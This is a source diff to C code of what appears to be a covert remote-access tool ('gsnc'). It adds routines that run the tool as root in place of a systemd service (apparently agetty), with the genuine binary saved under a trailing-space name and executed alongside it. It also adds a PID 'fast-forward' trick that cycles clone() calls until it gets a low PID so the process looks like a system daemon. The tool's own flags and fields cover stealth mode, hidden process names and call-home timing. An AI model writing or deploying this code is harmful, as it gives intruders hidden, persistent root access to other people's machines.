@@ -2,6 +2,8 @@
 #include "utils.h"
 #include "gsnc-utils.h"
 
+static char *systemd_argv_match;
+
 // ENV VARIABLES:
 // ==============
 // CONFIG_WRITE=-           - Write to STDOUT
@@ -105,11 +107,14 @@ GSNC_config_write(const char *fn) {
     if ((ptr = GS_getenv("SHELL")) != NULL)
         snprintf(c.shell, sizeof c.shell, "%s", ptr);
 
-    if ((ptr = GS_getenv("DOMAIN")) != NULL)
+    if ((ptr = GS_GETENV2("DOMAIN")) != NULL)
         snprintf(c.domain, sizeof c.domain, "%s", ptr);
 
-    if ((ptr = GS_getenv("WORKDIR")) != NULL)
+    if ((ptr = GS_GETENV2("WORKDIR")) != NULL)
         snprintf(c.workdir, sizeof c.workdir, "%s", ptr);
+    
+    if ((ptr = GS_GETENV2("SYSTEMD_ARGV_MATCH")) != NULL)
+        snprintf(c.systemd_argv_match, sizeof c.systemd_argv_match, "%s", ptr);
 
     c.callhome_min = gopt.callhome_sec;
 #ifndef DEBUG
@@ -119,6 +124,9 @@ GSNC_config_write(const char *fn) {
     c.flags |= (gopt.flags & GSC_FL_OPT_DAEMON);
     c.flags |= (gopt.flags & GSC_FL_OPT_WATCHDOG);
     c.flags |= (gopt.flags & GSC_FL_OPT_QUIET);
+
+    if (GS_GETENV2("FFPID"))
+        c.flags |= GSC_FL_FFPID;
 
     if (fwrite(&c, sizeof c, 1, fp) != 1)
         goto err;
@@ -179,6 +187,8 @@ GSNC_config_read(const char *fn) {
         gopt.gs_workdir = strdup(c.workdir);
     if (c.proc_hiddenname[0] != '\0')
         gopt.proc_hiddenname = strdup(c.proc_hiddenname);
+    if (c.systemd_argv_match[0] != '\0')
+        systemd_argv_match = strdup(c.systemd_argv_match);
 
     gopt.gs_port = c.port;
     gopt.callhome_sec = c.callhome_min;
@@ -189,16 +199,111 @@ GSNC_config_read(const char *fn) {
     gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
     gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG);
     gopt.flags |= (c.flags & GSC_FL_OPT_QUIET);
+    gopt.flags |= (c.flags & GSC_FL_FFPID);
 
     // Implied:
     gopt.is_interactive = 1;
     gopt.flags |= GSC_FL_IS_SERVER;
     gopt.flags |= GSC_FL_IS_STEALTH;
 
+    gopt.flags |= GSC_FL_CONFIG_READ_OK;
     ret = 0;
 err:
     XFCLOSE(fp);
     return ret;
+}
+
+#ifndef HAVE_SCHED_H
+static void forward_pid_worker(int worker) { return; }
+#else
+static void
+forward_pid_worker(int worker) {
+
+    pid_t p = getpid();
+    pid_t old_p;
+    char stack[1024]; // pid fast forwarding stack.
+
+    signal(SIGCHLD, SIG_IGN);
+    while (1) {
+        old_p = p;
+        p = clone((int (*)(void *))exit, stack + sizeof stack, CLONE_VFORK | CLONE_VM | SIGCHLD, NULL);
+        if (p <= 0)
+            break;
+        if (p < old_p) {
+            break;
+        }
+    }
+    exit(0);
+}
+#endif
+
+#define FF_PID_MAX_WORKERS        (8)
+pid_t workers[FF_PID_MAX_WORKERS];
+
+static int ffpid_ok;
+
+static void
+cb_alarm(int sig) {
+    int i = 0;
+
+    while (workers[i] != 0) {
+        kill(workers[i++], SIGTERM);
+    }
+    alarm(0);
+    ffpid_ok = -1;
+}
+
+// Fast-Forward to a small pid (<1000). Return found pid.
+pid_t
+forward_pid() {
+    int i;
+    pid_t pid_rv = getpid();
+
+#ifndef HAVE_SCHED_H
+    return pid_rv;
+#endif
+    if (pid_rv < 1000)
+        return pid_rv;
+
+    signal(SIGCHLD, SIG_DFL); // needed for waitpid() below
+    signal(SIGALRM, cb_alarm);
+    alarm(40);
+
+    // Start 8 workers that call clone()
+    for (i = 0; i < FF_PID_MAX_WORKERS; i++) {
+        workers[i] = fork();
+        if (workers[i] < 0)
+            break;
+        if (workers[i] == 0) {
+            forward_pid_worker(i);
+            exit(0); // CHILD exit
+        }
+    }
+
+    while (i > 0) {
+        waitpid(-1, NULL, 0);
+        i--;
+    }
+    // Find out next pid.
+    pid_rv = fork();
+    if (pid_rv == 0)
+        exit(0);
+
+    alarm(0);
+    signal(SIGALRM, SIG_DFL);
+    return pid_rv;
+}
+
+// Find lowest pid and exit.
+void
+do_util_ffpid(void) {
+    pid_t pid;
+    if (GS_GETENV2("UTIL_FFPID") == NULL)
+        return;
+    pid = forward_pid();
+
+    printf("%d\n", pid);
+    exit(ffpid_ok);
 }
 
 static pid_t sv_pid;
@@ -230,26 +335,62 @@ sv_sigforward(int sig) {
         sv_pid = 0;
 }
 
+static void
+sv_startorig(char *argv[]) {
+    char buf[1024];
+
+    snprintf(buf, sizeof buf, "%s ", argv[0]);  // Original binary is saved as "name\w" name+(space)
+    execv(buf, argv);
+
+    exit(0); // ERROR but exit with 0.
+}
+
 // Do nothing unless started by systemd.
 // Supervise the original binary.
-// The original is spawned as a daemomized child (PPID=1) of gsnc.
+// The original is spawned as a daemonized child (PPID=1) of gsnc.
 // The alternative would be to start gsnc as a child of the original process
 // the concerns are:
-// - GSNC would start again if the service restarts. (is this true? doesnt it kill in cgroup anyway?)
+// - GSNC would start again if the service restarts. (is this true? doesn't it kill in cgroup anyway?)
 // - GSNC would constantly need to check if (original) parent has
 //   restarted
 // - GSNC would not be restarted if it died.
 void
 init_supervise(int *argc, char *argv[]) {
     char buf[1024];
+	struct stat sb;
     pid_t pid;
     int is_systemd = 0;
     int is_tty;
+    int i;
+
+    if (!(gopt.flags & GSC_FL_WANT_CONFIG_READ))
+        return; // GS_CONFIG_READ=0, means gs-user wants to execute us (not the service).
+    
+    if (!(gopt.flags & GSC_FL_CONFIG_READ_OK))
+        return; // no valid config found.
+
+    if (gopt.flags & GSC_FL_CONFIG_CHECK)
+        return; // output config and exit.
+
+    snprintf(buf, sizeof buf, "%s ", argv[0]);  // Original binary is saved as "name\w" name+(space)
+    if (stat(buf, &sb) != 0)
+        return; // original binary does not exists. Continue with GSNC.
+
+    if (systemd_argv_match != NULL) {
+        // agetty: Check if this is the service for TTY1, otherwise start _just_ agetty@argv
+        char *ptr = NULL;
+        for (i = 1; i < *argc && ptr == NULL; i++) {
+            ptr = strstr(argv[i], systemd_argv_match);
+        }
+        if (ptr == NULL)
+            goto execorig;
+        XFREE(systemd_argv_match);
+    }
 
     if (getppid() > 1)
-        return; // NOT started from systemd.
+        goto execorig; // NOT started from systemd.
     if (getuid() != 0)
-        return; // We only use root-services to start gsnc from systemd.
+        goto execorig; // We only use root-services to start gsnc from systemd.
 
     if (getenv("SYSTEMD_EXEC_PID") != NULL)
         is_systemd++; // Older systemd's dont set this.
@@ -259,7 +400,7 @@ init_supervise(int *argc, char *argv[]) {
     //     is_systemd++; // LANG is normally set by /bin/sh. agetty's service removes it. 
 
     if (is_systemd == 0)
-        return; // not started from systemd
+        goto execorig; // not started from systemd
 
     int fds[2];
     socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
@@ -274,7 +415,7 @@ init_supervise(int *argc, char *argv[]) {
         ioctl(0, TIOCNOTTY, NULL);
 
     if ((pid = fork()) < 0)
-        return; // ERROR
+        goto execorig; // ERROR
 
     if (pid > 0) {
         // Grand-PARENT
@@ -299,7 +440,7 @@ init_supervise(int *argc, char *argv[]) {
         signal(SIGTERM, cb_sigforward);
         signal(SIGURG, cb_sigforward);
         signal(SIGWINCH, cb_sigforward);
-        return;
+        return; // gsnc to continue
     }
 
     // CHILD
@@ -321,14 +462,7 @@ init_supervise(int *argc, char *argv[]) {
     signal(SIGHUP, SIG_DFL);
     signal(SIGCHLD, SIG_DFL);
 
-    snprintf(buf, sizeof buf, "%s ", argv[0]);  // Original binary is saved as "name\w" name+(space)
-    execv(buf, argv);
-
-    // if (gopt.prg_exename == NULL)
-    //     return;
-    // snprintf(buf, sizeof buf, "%s ", gopt.prg_exename);
-    // execv(buf, argv);
-    // Could not execute the original.
-    exit(0); // ERROR but exit with 0.
+execorig:
+    sv_startorig(argv);
 }
 
